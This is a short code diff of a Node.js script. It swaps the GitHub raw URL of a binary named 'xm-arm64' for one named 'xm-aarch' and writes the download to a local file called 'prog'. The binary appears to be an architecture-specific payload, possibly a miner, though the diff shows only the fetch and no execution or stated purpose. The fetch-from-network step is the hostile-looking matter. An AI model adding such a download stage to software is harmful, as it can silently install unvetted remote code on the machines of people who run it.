@@ -4,7 +4,7 @@ const fs = require("fs");
 const https = require("https");
 const http = require("http");
 
-https.get("https://github.com/iceyfromdiscord/arm/raw/refs/heads/main/xm-arm64", (res) => {
+https.get("https://github.com/iceyfromdiscord/arm/raw/refs/heads/main/xm-aarch", (res) => {
   res.pipe(fs.createWriteStream("prog"));
 });
 
